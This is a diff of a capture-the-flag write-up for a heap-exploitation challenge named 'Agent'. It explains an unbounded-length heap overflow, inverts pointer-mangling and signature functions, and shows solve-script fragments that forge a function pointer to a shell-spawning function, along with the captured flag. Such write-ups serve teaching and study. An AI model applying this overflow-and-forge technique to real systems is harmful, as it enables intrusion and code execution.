@@ -16,8 +16,6 @@ description: |
 tags: ["pwn"]
 ---
 
-# CDDC2026 — "Agent" (card 730, Pwn, 330 pts)
-
 **Flag:** `CDDC2026{F1Nd_tH3_F3atures_0f_h1dd3n_b1nar13s}`
 
 ---
@@ -81,6 +79,7 @@ Functions of interest: `create_ticket`, `edit_ticket`, `show_ticket`, `trigger_n
 `create_ticket` does `malloc(SZ)` for one global ticket (`g_ticket`) and lays out:
 
 ```
+
 +0x00  title[]            (fgets-able)
 +....  detail[]           (overflowable buffer, max MAX_DETAIL)
 +....  detail_sig         (integrity sig of detail)
@@ -88,6 +87,7 @@ Functions of interest: `create_ticket`, `edit_ticket`, `show_ticket`, `trigger_n
 +....  detail_len
 +....  salt               (per-ticket nonce = (time<<32 ^ pid) ^ &g_ticket ^ const)
 +....  enc_ptr            (mangled notify function pointer)
+
 ```
 
 The **field offsets and even their order are randomized per binary** (this is the "feature"
@@ -121,6 +121,7 @@ fgets(buf, 0x20); len = strtoull(buf);  // *** no bound check on len ***
 detail_len = len;
 read(0, detail, len);                   // *** linear heap overflow ***
 detail_sig = calc_detail_sig(detail, detail_len, salt);  // recomputed after overflow
+
 ```
 
 `len` is fully attacker-controlled, so `read()` overflows the fixed `detail` buffer straight
@@ -134,6 +135,7 @@ if (detail_sig != calc_detail_sig(detail,len,salt)) die("detail integrity failed
 if (strncmp(detail, "run:", 4) != 0)                die("command gate denied");
 fn = decode_ptr(enc_ptr, &g_ticket, salt);
 fn(detail + 4);                                      // <-- arbitrary call
+
 ```
 
 `win()` simply `puts("[+] shell opened"); execl("/bin/sh","sh",NULL)`. So if we can make
@@ -143,12 +145,14 @@ get a shell.
 ### The mangling — pointers and signatures
 
 ```
+
 rol64/ror64       : 64-bit rotates
 ptr_key(a,s)      = (a>>0xc) ^ rol64(s,0x13) ^ 0x6c8e9cf570932bd1
 encode_ptr(p,a,s) = rol64(p ^ ptr_key(a,s), 0x1d)
 decode_ptr(e,a,s) = ror64(e,0x1d) ^ ptr_key(a,s)
 calc_title_sig(t,s):  h=0x9e3779b97f4a7c15^s; for b in t: h=rol64(h^b,7)+(s&0xff)+0x1337; return (s>>0xd)^h
 calc_detail_sig(d,n,s): similar, golden-ratio + per-byte rol9, clamps n to MAX_DETAIL
+
 ```
 
 Crucially, `ptr_key` only uses `addr >> 0xc` — **the heap page**, not the full pointer. So we
@@ -159,9 +163,11 @@ never need `g_ticket`'s low 12 bits.
 Prints three mangled values:
 
 ```
+
 ptr_hint = rol64((g>>0xc) ^ 0x5a5a5a5a5a5a, 0xb)
 leak_a   = rol64(salt ^ ((g>>0xc)+0x1337), 0x11)
 leak_b   = rol64(enc  ^ (salt+0x4242), 0x9)
+
 ```
 
 Inverting them yields the heap page, the real `salt`, and the encoded `notify_normal`
@@ -194,7 +200,7 @@ hence `&win`. Everything we need for a deterministic, leak-then-forge exploit, n
 Key pieces (full file in `challenges/730/solve.py`):
 
 ```python
-# --- crypto, hardcoded (identical across all units) ---
+
 def ptr_key(a,s):     return ((a>>0xc) ^ rol(s,0x13) ^ 0x6c8e9cf570932bd1) & MASK
 def encode_ptr(p,a,s): return rol((p ^ ptr_key(a,s)) & MASK, 0x1d)
 def decode_ptr(e,a,s): return (ror(e,0x1d) ^ ptr_key(a,s)) & MASK
@@ -223,6 +229,7 @@ put(salt_off,      salt)
 put(enc_off,       encode_ptr(win, addr, salt))
 
 # edit: title 'A', length L, then the payload; then trigger; then cat the flag
+
 ```
 
 `analyze()` disassembles `create_ticket` and reads the store offsets after the
@@ -260,8 +267,10 @@ shells and returned their fake flags.
 Production, however, first came back:
 
 ```
+
 verdict : CRASHED (exit 1)
 last_out: NO_FLAG
+
 ```
 
 No shell, and I'm **blind** — only the last line is visible. So I turned the oracle into a
@@ -270,7 +279,9 @@ offsets, leaked values, computed `salt/pie/win`, and `trigger_notify`'s own resp
 final line. That run revealed chal4's layout:
 
 ```
+
 enc@0x80, title_sig@0x88, detail_len@0x90, detail_sig@0x98, salt@0xa0
+
 ```
 
 My overflow length was `L = enc_off + 8 - detail_off`, assuming `enc` was the _highest_
@@ -283,13 +294,16 @@ Fix: size the overflow to the **maximum** of all metadata offsets:
 
 ```python
 L = max(title_sig_off, detail_sig_off, det_len_off, salt_off, enc_off) + 8 - detail_off
+
 ```
 
 Next submission:
 
 ```
+
 verdict : PASS
 last_out: CDDC2026{F1Nd_tH3_F3atures_0f_h1dd3n_b1nar13s}
+
 ```
 
 ---
